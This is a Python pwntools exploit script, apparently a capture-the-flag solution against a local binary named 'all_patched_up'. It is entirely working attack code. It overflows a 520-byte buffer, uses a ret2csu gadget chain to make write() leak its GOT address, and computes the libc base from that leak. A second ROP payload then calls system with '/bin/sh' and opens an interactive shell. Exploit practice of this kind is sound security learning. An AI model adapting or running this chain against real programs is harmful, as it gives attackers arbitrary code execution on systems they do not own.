from pwn import *
p = process("./all_patched_up")
elf = ELF("./all_patched_up")
context.arch = "amd64"
libc = elf.libc

ret = p64(0x000000000040101a)
write_got = elf.got["write"]
write_plt = elf.sym['write']
main = elf.sym["main"]
csu1 = p64(0x40124a)
csu2 = p64(0x401230)


def csu(r12,r13,r14,r15,ret):
        payload = b"A" * 520
        payload += csu1
        payload += p64(0x00) # rbx
        payload += p64(0x01) # rbp
        payload += p64(r12)  # r12 to rdi
        payload += p64(r13)  # r13 to rsi
        payload += p64(r14)  # r14 to rdx
        payload += p64(r15)  # r15
        payload += csu2
        payload += b"A" * 56
        payload += p64(ret)
        return payload


payload = csu(r12=1,r13=write_got,r14=8,r15=write_got,ret=main)

p.sendlineafter(b"> ", payload)
write = u64(p.recv(6).strip().ljust(8,b'\x00'))
libc.address = write - libc.sym['write']
log.success(f"write@GOT: {hex(write)}")
log.success(f"Libc Base Address: {hex(libc.address)}")

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

system = p64(libc.sym['system'])
binsh = p64(next(libc.search(b"/bin/sh\x00")))

payload = b"A"*520
payload += p64(pop_rdi)
payload += binsh
payload += ret
payload += system

p.sendlineafter(b"> ", payload)

p.interactive()